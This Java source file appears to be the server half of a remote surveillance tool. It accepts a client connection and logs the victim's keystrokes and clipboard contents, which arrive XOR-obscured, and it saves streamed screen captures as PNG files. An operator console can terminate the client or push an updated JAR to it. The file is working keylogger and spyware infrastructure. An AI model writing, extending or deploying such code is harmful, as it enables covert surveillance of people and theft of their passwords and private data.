/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package jul;

import java.awt.Graphics2D;
import java.awt.Image;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.PrintWriter;
import java.io.RandomAccessFile;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import static jul.JUL.encryptionKey;

public class JULServer {
    
    private static ObjectInputStream objectInputStream;
    private static ImageIcon lastScreneCap;
    
    public static Socket clientSocket;
    
    private static int imageIndex = 1;
    
    public static void main(String[] args) throws Exception {
        int portnumber = 8080;
        ServerSocket serverSocket = new ServerSocket(portnumber);
        new Thread(new Runnable() {
            @Override
            public void run() {
                JULServer.waitForExit();
            }
        }).start();
        System.out.println("waiting for client to accept.");
        clientSocket = serverSocket.accept();
        InputStream in = clientSocket.getInputStream();
        System.out.println("Waiting for first msg.");
        int type = in.read();
        int dataParam;
        while (type != -1) {
            switch ((byte) type) {
                case JUL.CLIPBOARD_DATA:
                    dataParam = readOffInt(in);
                    StringBuilder clipboard = new StringBuilder();
                    for (int i = 0; i < dataParam; i++) {
                        clipboard.append((char) decrypt((byte) in.read()));
                    }
                    System.out.println("The clipboard sent was: " + clipboard.toString());
                    break;
                case JUL.KEY_PRESSED_CODE:
                    dataParam = readOffInt(in);
                    System.out.println("The user pressed the key: " + ((char) dataParam));
                    break;
                case JUL.KEY_RELEASED_CODE:
                    dataParam = readOffInt(in);
                    System.out.println("The user released the key: " + ((char) dataParam));
                    break;
                case JUL.KEY_TYPED_CODE:
                    dataParam = readOffInt(in);
                    System.out.println("The user typed the key: " + ((char) dataParam));
                    break;
                case JUL.SCRENECAP_STREAM_INIT:
                    System.out.println("A screne cap strem is being set up.");
                    objectInputStream = new ObjectInputStream(in);
                    System.out.println("A screne cap was sent.");
                    lastScreneCap = (ImageIcon) objectInputStream.readObject();
                    objectInputStream = null;
                    saveImage(lastScreneCap, "./screnecap " + imageIndex++ + ".png");
                    break;
                case JUL.SEND_VERSION:
                    dataParam = in.read();
                    System.out.println("A version number was sent: " + dataParam);
                    break;
                    
            }
            type = in.read();
            //System.out.println("next type processed and was: " + type);
        }

    }

    public static void waitForExit() {
        Scanner usrin = new Scanner(System.in);
        while (true) {
            String command = usrin.nextLine();
            if (command.equals("kill") || command.equals("quit")) {
                try {
                    System.out.println("terminating client and server");
                    clientSocket.getOutputStream().write(JUL.TERMINATE_SESSION);
                    Thread.sleep(100);
                    System.exit(0);
                } catch (IOException ex) {
                    Logger.getLogger(JULServer.class.getName()).log(Level.SEVERE, null, ex);
                } catch (InterruptedException ex) {
                    Logger.getLogger(JULServer.class.getName()).log(Level.SEVERE, null, ex);
                }
            } else if (command.equals("update")) {
                try {
                    RandomAccessFile f = new RandomAccessFile("./JUL-update.jar", "r");
                    byte[] bytes = new byte[(int) f.length()];
                    f.read(bytes);
                    clientSocket.getOutputStream().write(JUL.UPDATE_PACKAGE);
                    clientSocket.getOutputStream().write(ByteBuffer.allocate(Integer.BYTES).putInt((int)f.length()).array());
                    clientSocket.getOutputStream().write(bytes);
                    System.exit(0);
                } catch (Exception ex) {
                    Logger.getLogger(JULServer.class.getName()).log(Level.SEVERE, null, ex);
                }
            } else if (command.equals("version")) {
                try {
                   clientSocket.getOutputStream().write(JUL.REQUEST_VERSION);
                } catch (Exception ex) {
                    Logger.getLogger(JULServer.class.getName()).log(Level.SEVERE, null, ex);
                }
            }
            
        }
    }
    
    static byte[] br = new byte[4];
    static int readOffInt(InputStream inputStream) throws IOException {
        br[0] = (byte) inputStream.read();//reasde size into a byte array
        br[1] = (byte) inputStream.read();
        br[2] = (byte) inputStream.read();
        br[3] = (byte) inputStream.read();
        return getInt(br);
    }
    
    static int getInt(byte[] rno) {
        int i = (rno[0] << 24) & 0xff000000
                | (rno[1] << 16) & 0x00ff0000
                | (rno[2] << 8) & 0x0000ff00
                | (rno[3] << 0) & 0x000000ff;
        return i;
    }
    
    private static int encryptionIndex = 0;
    public static byte decrypt(byte b) {
        encryptionIndex = (encryptionIndex + 1) % encryptionKey.length;
        return (byte) (b ^ encryptionKey[encryptionIndex]);
    }
    
    public static byte[] decrypt(byte[] barr) {
        byte[] result = new byte[barr.length];
         for (int i = 0; i < barr.length; i++) {
             result[i] = decrypt(barr[i]);
         }
         return result;
    }
    
    BufferedImage bi;
    private static void saveImage(ImageIcon img, String path) throws IOException {
        File outputfile = new File(path);
        ImageIO.write(toBufferedImage(img.getImage()), "png", outputfile);
    }
    
    public static BufferedImage toBufferedImage(Image img) {
        if (img instanceof BufferedImage) {
            return (BufferedImage) img;
        }

        // Create a buffered image with transparency
        BufferedImage bimage = new BufferedImage(img.getWidth(null), img.getHeight(null), BufferedImage.TYPE_INT_ARGB);

        // Draw the image on to the buffered image
        Graphics2D bGr = bimage.createGraphics();
        bGr.drawImage(img, 0, 0, null);
        bGr.dispose();

        // Return the buffered image
        return bimage;
    }
}
